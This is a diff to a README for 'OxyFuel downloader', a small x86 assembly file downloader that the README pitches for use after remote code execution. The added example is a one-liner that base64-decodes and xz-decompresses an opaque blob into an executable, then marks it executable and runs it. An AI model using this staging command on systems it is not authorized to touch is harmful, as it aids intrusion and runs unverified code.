@@ -1,4 +1,8 @@
-# Simple minimalistic file downloader
+# OxyFuel downloader
+This repository contains a minimalistic file downloader written in x86 32b assembly, only using syscalls directly.
+
+Just like an oxy-acetylene torch, tools from `OxyFuel` suite shall be used as a last ditch effort when no other tool is present, or will __cut it__.
+
 ## Prerequisites
 Can be installed with your package manager (probably).
 ```
@@ -35,4 +39,7 @@ In order to transfer, decompress and launch the downloader: **Before running thi
 ```shell
 make xz-compress
 ```
-This will print out the command you need to paste into the RCE of your choice to download the hosted file
+This will print out the command you need to paste into the RCE of your choice to download the hosted file, for example:
+```shell
+echo /Td6WFoAAATm1rRGAgAhARYAAAB0L+Wj4CJLAcRdAD+RRYRoO97epg8j1uh8YCpa/1qbgllS/4dw8XoEBxTbSEvHdJlt+ZQNULAGxulnfAFhQXLwO/ePAdZqzSa2/ACQnyQIwFprVzmpbG4fAYZaS0+QBvi+2lCOtHiq04T7viGcejwiG9aBkKVq28Q3JQqnKOUSoC7Y5RZSIGO3UuGkg3gEp62kKgStREqcR9jsWAhj9d0I20+5frRQJu7gwEhDPmhBiBWQCJytLI2y06oCj9h96hzTLJDx6wmap7xnupr0tM6fSScVS+BCmJ9n+1ySo0Qa/khX4v7DbeND+UrsbkeX9StJDOx7RY5DJ2GVkO8qwE8dleHAiIzMySa/fz+Gjc/Z1phQbCIsjGYSi0PxisVy29tyeLsoYZ29gFMw4MbN7Nl9nqdY4pdS9zs19IT5lC+6LQTDA0KUa4QtzJmS9RJ2YNXOrIhKP6zFpSm67GbJfMbDhJ5YBOKlMXkx35P0tN1ov2ZaA7GjuiVMtXX61r3BN8XbzBQif2xT/KqPa5Nu8eMWLkmFnVbCBWoruLidtrWXKsL8J7UD/kLwc+JIPzPM+iaVaKambgCOLwCVKgu5D2aHTacGBhanvww1O0cliuAAALsnUpDv60HxAAHgA8xEAAAtwbnZscRn+wIAAAAABFla | base64 -d | xz -d -c > downloader; chmod +x ./downloader && ./downloader
+```
